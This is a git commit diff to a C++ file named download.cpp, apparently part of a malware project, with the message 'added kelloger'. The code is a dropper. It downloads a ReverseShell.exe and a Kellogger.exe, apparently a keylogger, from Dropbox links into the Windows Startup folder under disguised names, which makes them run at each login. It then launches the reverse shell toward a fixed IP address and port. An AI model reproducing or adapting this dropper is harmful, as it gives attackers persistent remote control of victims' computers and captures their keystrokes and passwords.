63c85fe02c598fe7259f8c4a22b99b3f2fe5e3b0
connorhhuang <connorhhuang@gmail.com>
2023-05-30 12:58:48 -0700

    added kelloger

--- Components/download/download/download.cpp
+++ Components/download/download/download.cpp
@@ -2,7 +2,8 @@
 
 int main()
 {
-    system("curl https://www.dropbox.com/s/jmdz8s4mcyrjczv/ReverseShell.exe?dl=1 --output \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\seal.exe\"");
-    system("cd \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"|seal.exe");
+    system("curl https://www.dropbox.com/s/bwuphhdwe9p9j1k/ReverseShell.exe?dl=1 --output \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\seal.exe\"");
+    system("curl https://www.dropbox.com/s/filil5duichcn8u/Kellogger.exe?dl=1 --output \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chonkyseal.exe\"");
+    system("cd \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"|seal.exe 10.83.32.110 27015");
 }
 
